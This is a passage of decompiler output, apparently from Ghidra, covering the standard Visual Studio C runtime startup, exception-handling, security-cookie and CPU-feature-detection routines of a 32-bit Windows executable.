    DAT_0040838d = '\x01';
    uVar4 = CONCAT31((int3)((uint)iVar3 >> 8),1);
  }
  else {
    uVar4 = initialize_onexit_table(&DAT_00408390);
    if (uVar4 == 0) {
      uVar4 = initialize_onexit_table(&DAT_0040839c);
      iVar3 = 0;
      if (uVar4 == 0) goto LAB_00404b6d;
    }
    uVar4 = uVar4 & 0xffffff00;
  }
  return uVar4;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4

uint __cdecl FUN_00404b81(int param_1)

{
  uint uVar1;
  undefined4 local_14;
  
  uVar1 = FUN_00404a4d(0x400000,param_1 - 0x400000);
  if ((uVar1 == 0) || (*(int *)(uVar1 + 0x24) < 0)) {
    uVar1 = uVar1 & 0xffffff00;
  }
  else {
    uVar1 = CONCAT31((int3)(uVar1 >> 8),1);
  }
  ExceptionList = local_14;
  return uVar1;
}



// Library Function - Single Match
//  ___scrt_release_startup_lock
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

int __cdecl ___scrt_release_startup_lock(char param_1)

{
  int iVar1;
  bool bVar2;
  undefined3 extraout_var;
  int iVar3;
  
  bVar2 = ___scrt_is_ucrt_dll_in_use();
  iVar1 = DAT_00408388;
  iVar3 = CONCAT31(extraout_var,bVar2);
  if ((iVar3 != 0) && (param_1 == '\0')) {
    LOCK();
    DAT_00408388 = 0;
    UNLOCK();
    iVar3 = iVar1;
  }
  return iVar3;
}



// Library Function - Single Match
//  ___scrt_uninitialize_crt
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

undefined1 __cdecl ___scrt_uninitialize_crt(undefined4 param_1,char param_2)

{
  if ((DAT_0040838c == '\0') || (param_2 == '\0')) {
    FUN_00404d51();
    FUN_00404d51();
  }
  return 1;
}



undefined4 __cdecl FUN_00404c5d(undefined4 param_1)

{
  int iVar1;
  undefined4 uVar2;
  
  if (DAT_00408390 == -1) {
    iVar1 = crt_atexit();
  }
  else {
    iVar1 = register_onexit_function(&DAT_00408390,param_1);
  }
  uVar2 = 0;
  if (iVar1 == 0) {
    uVar2 = param_1;
  }
  return uVar2;
}



int __cdecl FUN_00404c8b(undefined4 param_1)

{
  int iVar1;
  
  iVar1 = FUN_00404c5d(param_1);
  return (iVar1 != 0) - 1;
}



uint FUN_00404ca0(void)

{
  DWORD DVar1;
  LARGE_INTEGER local_18;
  _FILETIME local_10;
  uint local_8;
  
  local_10.dwLowDateTime = 0;
  local_10.dwHighDateTime = 0;
  GetSystemTimeAsFileTime(&local_10);
  local_8 = local_10.dwHighDateTime ^ local_10.dwLowDateTime;
  DVar1 = GetCurrentThreadId();
  local_8 = local_8 ^ DVar1;
  DVar1 = GetCurrentProcessId();
  local_8 = local_8 ^ DVar1;
  QueryPerformanceCounter(&local_18);
  return local_18.s.HighPart ^ local_18.s.LowPart ^ local_8 ^ (uint)&local_8;
}



// Library Function - Single Match
//  ___security_init_cookie
// 
// Libraries: Visual Studio 2017 Release, Visual Studio 2019 Release

void __cdecl ___security_init_cookie(void)

{
  if ((DAT_00408000 == 0xbb40e64e) || ((DAT_00408000 & 0xffff0000) == 0)) {
    DAT_00408000 = FUN_00404ca0();
    if (DAT_00408000 == 0xbb40e64e) {
      DAT_00408000 = 0xbb40e64f;
    }
    else if ((DAT_00408000 & 0xffff0000) == 0) {
      DAT_00408000 = DAT_00408000 | (DAT_00408000 | 0x4711) << 0x10;
    }
  }
  DAT_00408040 = ~DAT_00408000;
  return;
}



undefined1 FUN_00404d51(void)

{
  return 1;
}



// guard_check_icall

void __cdecl guard_check_icall(void)

{
  return;
}



undefined * FUN_00404dad(void)

{
  return &DAT_004083e4;
}



undefined * FUN_00404db3(void)

{
  return &DAT_004083e0;
}



void FUN_00404db9(void)

{
  code *pcVar1;
  BOOL BVar2;
  LONG LVar3;
  undefined4 local_328 [39];
  EXCEPTION_RECORD local_5c;
  _EXCEPTION_POINTERS local_c;
  
  BVar2 = IsProcessorFeaturePresent(0x17);
  if (BVar2 != 0) {
    pcVar1 = (code *)swi(0x29);
    (*pcVar1)();
  }
  FUN_00404fa7();
  memset(local_328,0,0x2cc);
  local_328[0] = 0x10001;
  memset(&local_5c,0,0x50);
  local_5c.ExceptionCode = 0x40000015;
  local_5c.ExceptionFlags = 1;
  BVar2 = IsDebuggerPresent();
  local_c.ExceptionRecord = &local_5c;
  local_c.ContextRecord = (PCONTEXT)local_328;
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  LVar3 = UnhandledExceptionFilter(&local_c);
  if ((LVar3 == 0) && (BVar2 != 1)) {
    FUN_00404fa7();
  }
  return;
}



WORD FUN_00404ece(void)

{
  WORD WVar1;
  _STARTUPINFOW local_48;
  
  memset(&local_48,0,0x44);
  GetStartupInfoW(&local_48);
  WVar1 = 10;
  if (((byte)local_48.dwFlags & 1) != 0) {
    WVar1 = local_48.wShowWindow;
  }
  return WVar1;
}



uint FUN_00404f03(void)

{
  HMODULE pHVar1;
  int *piVar2;
  
  pHVar1 = GetModuleHandleW((LPCWSTR)0x0);
  if ((((pHVar1 != (HMODULE)0x0) && ((short)pHVar1->unused == 0x5a4d)) &&
      (piVar2 = (int *)((int)&pHVar1->unused + pHVar1[0xf].unused), *piVar2 == 0x4550)) &&
     ((pHVar1 = (HMODULE)0x10b, (short)piVar2[6] == 0x10b && (0xe < (uint)piVar2[0x1d])))) {
    return CONCAT31(1,piVar2[0x3a] != 0);
  }
  return (uint)pHVar1 & 0xffffff00;
}



undefined4 FUN_00404f51(int *param_1)

{
  int iVar1;
  int *piVar2;
  int *piVar3;
  
  piVar3 = (int *)*param_1;
  if (((*piVar3 == -0x1f928c9d) && (piVar3[4] == 3)) &&
     ((iVar1 = piVar3[5], iVar1 == 0x19930520 ||
      (((iVar1 == 0x19930521 || (iVar1 == 0x19930522)) || (iVar1 == 0x1994000)))))) {
    piVar2 = (int *)__current_exception();
    *piVar2 = (int)piVar3;
    iVar1 = param_1[1];
    piVar3 = (int *)__current_exception_context();
    *piVar3 = iVar1;
                    // WARNING: Subroutine does not return
    terminate();
  }
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00404fa7(void)

{
  _DAT_004083c0 = 0;
  return;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_2
// Library Function - Single Match
//  __SEH_prolog4
// 
// Library: Visual Studio

void __cdecl __SEH_prolog4(undefined4 param_1,int param_2)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined4 unaff_retaddr;
  uint auStack_1c [5];
  undefined1 local_8 [8];
  
  iVar1 = -param_2;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_00408000 ^ (uint)&param_2;
  *(undefined4 *)((int)auStack_1c + iVar1) = unaff_retaddr;
  ExceptionList = local_8;
  return;
}



// Library Function - Single Match
//  __except_handler4
// 
// Library: Visual Studio 2019 Release

void __cdecl
__except_handler4(int *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  int iVar1;
  
  iVar1 = FUN_00405446(*param_1);
  *param_1 = iVar1;
  except_handler4_common(&DAT_00408000,__security_check_cookie,param_1,param_2,param_3,param_4);
  return;
}



// WARNING: Removing unreachable block (ram,0x004050b6)
// WARNING: Removing unreachable block (ram,0x004051c4)
// WARNING: Removing unreachable block (ram,0x00405199)
// WARNING: Removing unreachable block (ram,0x0040515d)
// WARNING: Removing unreachable block (ram,0x004050f1)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_00405084(void)

{
  int *piVar1;
  uint *puVar2;
  int *piVar3;
  int iVar4;
  undefined8 uVar5;
  uint uVar6;
  BOOL BVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  uint in_XCR0;
  uint local_1c;
  uint local_18;
  uint local_14;
  
  DAT_00408058 = DAT_00408058 | 1;
  DAT_004083c8 = 0;
  BVar7 = IsProcessorFeaturePresent(10);
  uVar8 = DAT_00408050;
  uVar6 = DAT_00408058;
  if (BVar7 != 0) {
    piVar1 = (int *)cpuid_basic_info(0);
    puVar2 = (uint *)cpuid_Version_info(1);
    if (((piVar1[2] == 0x49656e69 && piVar1[3] == 0x6c65746e) && piVar1[1] == 0x756e6547) &&
       (((((uVar8 = *puVar2 & 0xfff3ff0, uVar8 == 0x106c0 || (uVar8 == 0x20660)) ||
          (uVar8 == 0x20670)) || ((uVar8 == 0x30650 || (uVar8 == 0x30660)))) || (uVar8 == 0x30670)))
       ) {
      _DAT_004083cc = _DAT_004083cc | 1;
    }
    uVar9 = 0;
    uVar10 = 0;
    local_18 = 0;
    local_1c = 0;
    if (6 < *piVar1) {
      piVar3 = (int *)cpuid_Extended_Feature_Enumeration_info(7);
      uVar9 = piVar3[1];
      local_18 = piVar3[2];
      if ((uVar9 & 0x200) != 0) {
        _DAT_004083cc = _DAT_004083cc | 2;
      }
      if (0 < *piVar3) {
        iVar4 = cpuid_Extended_Feature_Enumeration_info(7);
        local_1c = *(uint *)(iVar4 + 8);
      }
      if (0x23 < *piVar1) {
        iVar4 = cpuid(0x24);
        uVar10 = *(uint *)(iVar4 + 4);
      }
    }
    DAT_004083c8 = 1;
    uVar8 = DAT_00408050 & 0xfffffffe;
    uVar6 = DAT_00408058 | 2;
    if ((puVar2[3] & 0x100000) != 0) {
      DAT_004083c8 = 2;
      uVar8 = DAT_00408050 & 0xffffffee;
      uVar6 = DAT_00408058 | 6;
      if ((puVar2[3] & 0x18000000) == 0x18000000) {
        uVar5 = xinuse(0);
        local_14 = in_XCR0 & (uint)uVar5;
        if ((local_14 & 6) == 6) {
          DAT_004083c8 = 3;
          uVar6 = DAT_00408058 | 0xe;
          if ((uVar9 & 0x20) != 0) {
            DAT_004083c8 = 5;
            uVar8 = DAT_00408050 & 0xffffffec;
            uVar6 = DAT_00408058 | 0x2e;
            if (((uVar9 & 0xd0030000) == 0xd0030000) && ((local_14 & 0xe0) == 0xe0)) {
              DAT_00408058 = DAT_00408058 | 0x6e;
              DAT_004083c8 = 6;
              uVar8 = DAT_00408050 & 0xffffffc8;
              uVar6 = DAT_00408058;
            }
          }
          DAT_00408058 = uVar6;
          DAT_00408050 = uVar8;
          if ((local_18 & 0x800000) != 0) {
            DAT_00408050 = DAT_00408050 & 0xfeffffff;
          }
          uVar8 = DAT_00408050;
          uVar6 = DAT_00408058;
          if (((local_1c & 0x80000) != 0) && ((local_14 & 0xe0) == 0xe0)) {
            _DAT_004083c4 = uVar10 & 0x400ff;
            uVar8 = ~(uVar10 >> 0x10 & 6 | 0x1000029) & DAT_00408050;
            if (1 < (byte)_DAT_004083c4) {
              uVar8 = uVar8 & 0xffffffbf;
            }
          }
        }
      }
    }
  }
  DAT_00408058 = uVar6;
  DAT_00408050 = uVar8;
  return 0;
}



// Library Function - Single Match
//  ___scrt_is_ucrt_dll_in_use
// 
// Library: Visual Studio 2019 Release

bool ___scrt_is_ucrt_dll_in_use(void)

{
  return DAT_0040805c != 0;
}



void __current_exception(void)

{
                    // WARNING: Could not recover jumptable at 0x004053aa. Too many branches
                    // WARNING: Treating indirect jump as call
  __current_exception();
  return;
}



void __current_exception_context(void)

{
                    // WARNING: Could not recover jumptable at 0x004053b0. Too many branches
                    // WARNING: Treating indirect jump as call
  __current_exception_context();
  return;
}



void * __cdecl memset(void *_Dst,int _Val,size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x004053b6. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = memset(_Dst,_Val,_Size);
  return pvVar1;
}



void __cdecl except_handler4_common(void)

{
                    // WARNING: Could not recover jumptable at 0x004053bc. Too many branches
                    // WARNING: Treating indirect jump as call
  except_handler4_common();
  return;
}



void __cdecl get_narrow_winmain_command_line(void)

{
                    // WARNING: Could not recover jumptable at 0x004053e0. Too many branches
                    // WARNING: Treating indirect jump as call
  get_narrow_winmain_command_line();
  return;
}



void __cdecl initterm(void)

{
                    // WARNING: Could not recover jumptable at 0x004053e6. Too many branches
                    // WARNING: Treating indirect jump as call
  initterm();
  return;
}



void __cdecl initterm_e(void)

{
                    // WARNING: Could not recover jumptable at 0x004053ec. Too many branches
                    // WARNING: Treating indirect jump as call
  initterm_e();
  return;
}



void __cdecl exit(int _Code)

{
                    // WARNING: Could not recover jumptable at 0x004053f2. Too many branches
                    // WARNING: Subroutine does not return
                    // WARNING: Treating indirect jump as call
  exit(_Code);
  return;
}



void __cdecl _exit(int _Code)

{
                    // WARNING: Could not recover jumptable at 0x004053f8. Too many branches
                    // WARNING: Subroutine does not return
                    // WARNING: Treating indirect jump as call
  _exit(_Code);
  return;
}



void __cdecl _cexit(void)

{
                    // WARNING: Could not recover jumptable at 0x00405404. Too many branches
                    // WARNING: Treating indirect jump as call
  _cexit();
  return;
}



void __cdecl register_thread_local_exe_atexit_callback(void)

{
                    // WARNING: Could not recover jumptable at 0x00405410. Too many branches
                    // WARNING: Treating indirect jump as call
  register_thread_local_exe_atexit_callback();
  return;
}



void __cdecl initialize_onexit_table(void)

{
                    // WARNING: Could not recover jumptable at 0x00405428. Too many branches
                    // WARNING: Treating indirect jump as call
  initialize_onexit_table();
  return;
}



void __cdecl register_onexit_function(void)

{
                    // WARNING: Could not recover jumptable at 0x0040542e. Too many branches
                    // WARNING: Treating indirect jump as call
  register_onexit_function();
  return;
}



void __cdecl crt_atexit(void)

{
                    // WARNING: Could not recover jumptable at 0x00405434. Too many branches
                    // WARNING: Treating indirect jump as call
  crt_atexit();
  return;
}



void terminate(void)

{
                    // WARNING: Could not recover jumptable at 0x00405440. Too many branches
                    // WARNING: Subroutine does not return
                    // WARNING: Treating indirect jump as call
  terminate();
  return;
}



int __cdecl FUN_00405446(int param_1)

{
  uint uVar1;
  
  if ((DAT_004083c8 < 1) || ((param_1 != -0x3ffffd4c && (param_1 != -0x3ffffd4b)))) {
    return param_1;
  }
  uVar1 = MXCSR ^ 0x3f;
  if ((uVar1 & 0x81) != 0) {
    if ((uVar1 & 0x204) == 0) {
      return -0x3fffff72;
    }
    if ((uVar1 & 0x102) != 0) {
      if ((uVar1 & 0x408) == 0) {
        return -0x3fffff6f;
      }
      if ((uVar1 & 0x810) != 0) {
        if ((uVar1 & 0x1020) != 0) {
          return param_1;
        }
        return -0x3fffff71;
      }
      return -0x3fffff6d;
    }
  }
  return -0x3fffff70;
}



// WARNING: This is an inlined function

void __alloca_probe(void)

{
  undefined1 *in_EAX;
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 unaff_retaddr;
  undefined1 auStack_4 [4];
  
  puVar2 = (undefined4 *)((int)&stack0x00000000 - (int)in_EAX & ~-(uint)(&stack0x00000000 < in_EAX))
  ;
  for (puVar1 = (undefined4 *)((uint)auStack_4 & 0xfffff000); puVar2 < puVar1;
      puVar1 = puVar1 + -0x400) {
  }
  *puVar2 = unaff_retaddr;
  return;
}



void _CIfmod(void)

{
                    // WARNING: Could not recover jumptable at 0x004054eb. Too many branches
                    // WARNING: Treating indirect jump as call
  _CIfmod();
  return;
}



void __cdecl libm_sse2_cos_precise(void)

{
                    // WARNING: Could not recover jumptable at 0x004054f1. Too many branches
                    // WARNING: Treating indirect jump as call
  libm_sse2_cos_precise();
  return;
}



void __cdecl libm_sse2_pow_precise(void)

{
                    // WARNING: Could not recover jumptable at 0x004054f7. Too many branches
                    // WARNING: Treating indirect jump as call
  libm_sse2_pow_precise();
  return;
}



void __cdecl libm_sse2_sin_precise(void)

{
                    // WARNING: Could not recover jumptable at 0x004054fd. Too many branches
                    // WARNING: Treating indirect jump as call
  libm_sse2_sin_precise();
  return;
}



void __cdecl libm_sse2_tan_precise(void)

{
                    // WARNING: Could not recover jumptable at 0x00405503. Too many branches
                    // WARNING: Treating indirect jump as call
  libm_sse2_tan_precise();
  return;
}


